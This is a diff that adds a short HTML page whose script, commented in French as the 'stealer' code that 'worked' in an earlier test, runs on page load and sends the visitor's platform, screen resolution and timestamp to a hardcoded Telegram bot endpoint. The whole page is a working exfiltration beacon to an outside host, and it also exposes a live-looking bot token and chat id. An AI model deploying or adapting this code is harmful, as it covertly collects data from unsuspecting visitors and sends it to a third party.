@@ -1,0 +1,17 @@
+<!DOCTYPE html><html><head><meta charset="UTF-8"><title>⚡</title></head><body>
+<script>
+// RIEN QUE LE STEALER — même code que test.html qui a marché
+(async function(){
+  document.title="⏳";
+  try{
+    const r=await fetch("https://api.telegram.org/bot8924356503:AAHvOqKy29W8oJParf_WuZP8r2WbHvoon74/sendMessage",{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:"chat_id=7947710235&text="+encodeURIComponent("✅ *ÇA MARCHE* — "+navigator.platform+" | "+screen.width+"x"+screen.height+" | "+new Date().toISOString().slice(0,19))
+    });
+    const j=await r.json();
+    document.title=j.ok?"✅ OK":"❌ "+j.description;
+  }catch(e){document.title="❌ "+e.message.slice(0,30)}
+})();
+</script>
+</body></html>
